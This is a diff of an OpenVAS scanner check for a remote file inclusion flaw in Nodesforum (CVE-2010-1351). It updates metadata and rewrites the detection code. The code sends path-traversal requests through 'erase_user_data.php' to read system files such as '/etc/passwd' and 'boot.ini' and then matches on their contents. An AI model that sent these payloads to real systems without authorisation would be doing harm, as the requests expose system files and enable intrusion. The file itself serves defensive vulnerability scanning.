@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: secpod_nodesforum_mult_rfi_vuln.nasl 5394 2017-02-22 09:22:42Z teissa $
+# $Id: secpod_nodesforum_mult_rfi_vuln.nasl 5900 2017-04-08 17:34:18Z cfi $
 #
 # Nodesforum Multiple Remote File Inclusion Vulnerabilities
 #
@@ -27,37 +27,41 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.902040");
-  script_version("$Revision: 5394 $");
-  script_tag(name:"last_modification", value:"$Date: 2017-02-22 10:22:42 +0100 (Wed, 22 Feb 2017) $");
+  script_version("$Revision: 5900 $");
+  script_tag(name:"last_modification", value:"$Date: 2017-04-08 19:34:18 +0200 (Sat, 08 Apr 2017) $");
   script_tag(name:"creation_date", value:"2010-04-16 16:17:26 +0200 (Fri, 16 Apr 2010)");
   script_cve_id("CVE-2010-1351");
   script_tag(name:"cvss_base", value:"6.8");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
   script_name("Nodesforum Multiple Remote File Inclusion Vulnerabilities");
-  script_xref(name : "URL" , value : "http://secunia.com/advisories/39311");
-  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/57517");
-  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/12047");
-
   script_category(ACT_ATTACK);
   script_copyright("Copyright (c) 2010 SecPod");
-  script_dependencies("find_service1.nasl", "http_version.nasl");
   script_family("Web application abuses");
+  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
   script_require_ports("Services/www", 80);
   script_exclude_keys("Settings/disable_cgi_scanning");
 
-  script_tag(name : "impact" , value : "Successful exploitation will let attackers to execute arbitrary
+  script_xref(name:"URL", value:"http://secunia.com/advisories/39311");
+  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/57517");
+  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/12047");
+
+  script_tag(name:"impact", value:"Successful exploitation will let attackers to execute arbitrary
   code in a user's browser session in the context of an affected site.
 
   Impact Level: Application");
-  script_tag(name : "affected" , value : "Nodesforum version 1.045 and prior.");
-  script_tag(name : "insight" , value : "Input passed to '_nodesforum_path_from_here_to_nodesforum_folder'
+
+  script_tag(name:"affected", value:"Nodesforum version 1.045 and prior.");
+
+  script_tag(name:"insight", value:"Input passed to '_nodesforum_path_from_here_to_nodesforum_folder'
   parameter in 'erase_user_data.php' and to the '_nodesforum_code_path' parameter
   in 'pre_output.php' is not being validated before being used to include files.");
-  script_tag(name : "solution" , value : "No solution or patch was made available for at least one year
+
+  script_tag(name:"solution", value:"No solution or patch was made available for at least one year
   since disclosure of this vulnerability. Likely none will be provided anymore.
   General solution options are to upgrade to a newer release, disable respective
   features, remove the product or replace the product by another one.");
-  script_tag(name : "summary" , value : "This host is running Nodesforum and is prone to multiple remote file
+
+  script_tag(name:"summary", value:"This host is running Nodesforum and is prone to multiple remote file
   inclusion vulnerabilities.");
 
   script_tag(name:"qod_type", value:"remote_app");
@@ -66,45 +70,32 @@ if(description)
   exit(0);
 }
 
-
 include("http_func.inc");
 include("http_keepalive.inc");
 
-## Get HTTP Port
-nodePort = get_http_port(default:80);
+port = get_http_port( default:80 );
+if( ! can_host_php( port:port ) ) exit( 0 );
 
-if (!can_host_php(port:nodePort)) exit(0);
+files = traversal_files();
 
-foreach dir (make_list_unique("/nodesforum", "/Nodesforum", "/", cgi_dirs(port:nodePort)))
-{
+foreach dir( make_list_unique( "/nodesforum", "/Nodesforum", "/", cgi_dirs( port:port ) ) ) {
 
-  if(dir == "/") dir = "";
+  if( dir == "/" ) dir = "";
+  url = dir + "/index.php";
 
-  sndReq = http_get(item:string(dir , "/index.php"), port:nodePort);
-  rcvRes = http_keepalive_send_recv(port:nodePort, data:sndReq);
+  res = http_get_cache( item:url, port:port );
 
-  if("Nodesforum" >< rcvRes)
-  {
-    # Attack string for Linux
-    sndReq = http_get(item:string(dir, "/erase_user_data.php?_nodesforum_path" +
-                      "_from_here_to_nodesforum_folder=../../../../../../../" +
-                      "../etc/passwd%00"), port:nodePort);
-    rcvRes = http_keepalive_send_recv(port:nodePort, data:sndReq);
-    if(("root" >< rcvRes) && ("daemon:/sbin:/sbin/" >< rcvRes))
-    {
-      security_message(port:nodePort);
-      exit(0);
-    }
+  if( res =~ "^HTTP/1\.[01] 200" && "Nodesforum" >< res ) {
 
-    # Attack string for Windows
-    sndReq = http_get(item:string(dir, "/erase_user_data.php?_nodesforum_path" +
-                      "_from_here_to_nodesforum_folder=../../../../../../../" +
-                      "../boot.ini%00"), port:nodePort);
-    rcvRes = http_keepalive_send_recv(port:nodePort, data:sndReq);
-    if(("\WINDOWS" >< rcvRes) && ("partition" >< rcvRes))
-    {
-      security_message(port:nodePort);
-      exit(0);
+    foreach file( keys( files ) ) {
+
+      url = string(dir, "/erase_user_data.php?_nodesforum_path_from_here_to_nodesforum_folder=../../../../../../../../", files[file], "%00");
+
+      if( http_vuln_check( port:port, url:url, pattern:file ) ) {
+        report = report_vuln_url( port:port, url:url );
+        security_message( port:port, data:report );
+        exit( 0 );
+      }
     }
   }
 }
